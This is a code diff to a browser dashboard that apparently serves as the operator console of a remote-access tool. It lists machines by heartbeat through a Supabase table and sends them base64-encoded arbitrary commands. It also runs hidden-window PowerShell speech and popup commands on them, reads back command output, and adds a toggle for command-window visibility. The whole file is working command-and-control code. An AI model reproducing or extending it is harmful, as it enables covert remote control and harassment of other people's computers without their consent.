@@ -15,10 +15,6 @@
             display: none !important;
         }
 
-        .user-link:hover {
-            text-decoration: underline;
-        }
-
         body {
             background: black;
             color: white;
@@ -28,12 +24,37 @@
             min-height: 100vh;
         }
 
+        .user-row {
+            display: flex;
+            align-items: center;
+            padding: 3px 0;
+            max-width: 250px;
+        }
+
+        .username-interactive {
+            cursor: pointer;
+            font-weight: bold;
+            display: inline-block;
+        }
+
+        .username-interactive:hover {
+            text-decoration: underline;
+            color: #fff;
+        }
+
+        .timestamp-static {
+            color: #777;
+            font-size: 0.85em;
+            white-space: nowrap;
+            font-variant-numeric: tabular-nums;
+        }
+
         .context-menu {
             position: fixed;
             background-color: #222;
             border: 1px solid #555;
             z-index: 100;
-            min-width: 220px;
+            min-width: 250px;
             box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.5);
         }
 
@@ -73,23 +94,34 @@
     @keydown.window.a="if(targetUser) quickCommand('popup')">
 
     <div x-show="!selected">
-        <template x-for="user in rows" :key="user.username">
-            <div style="padding: 3px;" @mouseenter="targetUser = user" @mouseleave="if(!showMenu) targetUser = null">
-                <span :style="{ color: getStatusColor(user) }">●</span>
-                <small @contextmenu.prevent="openMenu($event, user)" class="user-link" style="cursor: pointer;">
-                    <span x-text="user.username" style="font-weight: bold; margin-left: 5px;"></span>
-                    <span x-text="new Date(user.updated_at).toLocaleString()"
-                        style="margin-left: 10px; color: #888;"></span>
-                </small>
+        <template x-for="user in sortedRows" :key="user.username">
+            <div class="user-row">
+                <span :style="{ color: getStatusColor(user) }" style="margin-right: 8px;">●</span>
+
+                <span class="username-interactive" x-text="user.username" @mouseenter="if(!showMenu) targetUser = user"
+                    @mouseleave="if(!showMenu) targetUser = null" @contextmenu.prevent="openMenu($event, user)">
+                </span>
+
+                <div style="flex-grow: 1; min-width: 20px;"></div>
+
+                <span class="timestamp-static" x-text="formatDate(user.updated_at)"></span>
             </div>
         </template>
     </div>
 
     <div x-cloak x-show="showMenu" class="context-menu" :style="`top: ${menuPos.y}px; left: ${menuPos.x}px;`"
         x-transition @click.away="showMenu = false">
+
         <div class="context-menu-item" @click="fetchSingle(targetUser); showMenu = false">
             <span>Send Command</span> <span class="hint">C</span>
         </div>
+
+        <div class="context-menu-item" @click="toggleVisibility(targetUser); showMenu = false">
+            <span>CMD Visibility</span>
+            <span :style="{ color: targetUser?.visible ? 'green' : 'red' }"
+                x-text="targetUser?.visible ? '[ ON ]' : '[ OFF ]'"></span>
+        </div>
+
         <div class="context-menu-item" @click="viewOutput(targetUser); showMenu = false">
             <span>View Output (col)</span> <span class="hint">V</span>
         </div>
@@ -111,7 +143,6 @@
                 selected: false,
                 url: localStorage.getItem('supa_url'),
                 apiKey: localStorage.getItem('supa_key'),
-
                 showMenu: false,
                 menuPos: { x: 0, y: 0 },
                 targetUser: null,
@@ -120,20 +151,42 @@
                     if (!this.url || this.url === 'null' || !this.apiKey || this.apiKey === 'null') {
                         const u = prompt('Enter Supabase URL:');
                         const k = prompt('Enter Supabase API Key:');
-
                         if (!u || !k) {
                             alert('Both URL and API Key are required!');
                             location.reload();
                         }
-
                         this.url = u;
                         this.apiKey = k;
                         localStorage.setItem('supa_url', u);
                         localStorage.setItem('supa_key', k);
                     }
-
                     this.fetchData();
                     setInterval(() => this.fetchData(), 4000);
+                },
+
+                formatDate(isoString) {
+                    const date = new Date(isoString);
+                    const pad = (num) => num.toString().padStart(2, '0');
+
+                    const d = pad(date.getDate());
+                    const m = pad(date.getMonth() + 1);
+                    const y = date.getFullYear();
+                    const h = pad(date.getHours());
+                    const min = pad(date.getMinutes());
+                    const s = pad(date.getSeconds());
+
+                    return `${d}/${m}/${y} ${h}:${min}:${s}`;
+                },
+
+                get sortedRows() {
+                    return [...this.rows].sort((a, b) => {
+                        const aOnline = this.getStatusColor(a) === 'green' ? 0 : 1;
+                        const bOnline = this.getStatusColor(b) === 'green' ? 0 : 1;
+
+                        if (aOnline !== bOnline) return aOnline - bOnline;
+
+                        return a.username.localeCompare(b.username);
+                    });
                 },
 
                 openMenu(e, user) {
@@ -142,36 +195,53 @@
                     this.showMenu = true;
                 },
 
-                quickCommand(type, e = null) {
-                    const user = this.targetUser;
-                    this.showMenu = false;
-                    if (this.getStatusColor(user) !== 'green') return;
-
-                    const isShift = e && e.shiftKey;
-                    const voiceType = isShift ? 'Zira' : 'David';
-
-                    let msg = prompt(`Enter message to ${type === 'speak' ? `speak with the ${voiceType} voice` : 'display as a popup'} for ${user.username}:`);
-                    if (!msg) return;
-
-                    msg = msg.replace(/'/g, "''");
-
-                    let rawCmd = "";
-                    if (type === 'speak') {
-                        rawCmd = `powershell -W H -C "$s=New-Object -Com SAPI.SpVoice;$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${voiceType}*'};$s.Speak('${msg}')"`;
-                    } else if (type === 'popup') {
-                        rawCmd = `powershell -W H -C "(New-Object -Com WScript.Shell).Popup('${msg}')"`;
-                    }
-
-                    this.sendCommand(user.username, btoa(rawCmd));
-                },
-
                 async fetchData() {
                     try {
-                        const response = await fetch(`${this.url}?select=username,updated_at&order=updated_at.desc`, {
+                        const response = await fetch(`${this.url}?select=username,updated_at,visible`, {
                             headers: { 'apikey': this.apiKey, 'Authorization': `Bearer ${this.apiKey}` }
                         });
                         this.rows = await response.json();
                     } catch (err) { console.error(err); }
+                },
+
+                getStatusColor(user) {
+                    const diff = (new Date().getTime() - new Date(user.updated_at).getTime()) / 1000;
+                    if (diff < 20) return 'green';
+                    if (diff < 60) return 'yellow';
+                    return 'red';
+                },
+
+                async toggleVisibility(user) {
+                    const newState = !user.visible;
+                    user.visible = newState;
+                    try {
+                        await fetch(`${this.url}?username=eq.${user.username}`, {
+                            method: 'PATCH',
+                            headers: {
+                                'apikey': this.apiKey,
+                                'Authorization': `Bearer ${this.apiKey}`,
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ visible: newState })
+                        });
+                    } catch (err) {
+                        console.error(err);
+                        user.visible = !newState;
+                    }
+                },
+
+                quickCommand(type, e = null) {
+                    const user = this.targetUser;
+                    this.showMenu = false;
+                    if (this.getStatusColor(user) !== 'green') return;
+                    const voiceType = (e && e.shiftKey) ? 'Zira' : 'David';
+                    let msg = prompt(`Message for ${user.username}:`);
+                    if (!msg) return;
+                    msg = msg.replace(/'/g, "''");
+                    let rawCmd = type === 'speak'
+                        ? `powershell -W H -C "$s=New-Object -Com SAPI.SpVoice;$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${voiceType}*'};$s.Speak('${msg}')"`
+                        : `powershell -W H -C "(New-Object -Com WScript.Shell).Popup('${msg}')"`;
+                    this.sendCommand(user.username, btoa(rawCmd));
                 },
 
                 async viewOutput(user) {
@@ -184,22 +254,15 @@
                         if (data[0]?.out) {
                             const decoded = atob(data[0].out);
                             await navigator.clipboard.writeText(decoded);
-                            alert(`${decoded}`);
+                            alert(decoded);
                         }
                     } catch (err) { console.error(err); }
-                },
-
-                getStatusColor(user) {
-                    const diff = (new Date().getTime() - new Date(user.updated_at).getTime()) / 1000;
-                    if (diff < 20) return 'green';
-                    if (diff < 60) return 'yellow';
-                    return 'red';
                 },
 
                 fetchSingle(user) {
                     this.showMenu = false;
                     if (this.getStatusColor(user) !== 'green') return;
-                    const cmd = prompt(`Send command to ${user.username}:`);
+                    const cmd = prompt(`Command for ${user.username}:`);
                     if (cmd) this.sendCommand(user.username, btoa(cmd));
                 },
 
@@ -209,8 +272,7 @@
                         headers: {
                             'apikey': this.apiKey,
                             'Authorization': `Bearer ${this.apiKey}`,
-                            'Content-Type': 'application/json',
-                            'Prefer': 'return=minimal'
+                            'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({ cmd: b64Cmd, run: true })
                     });
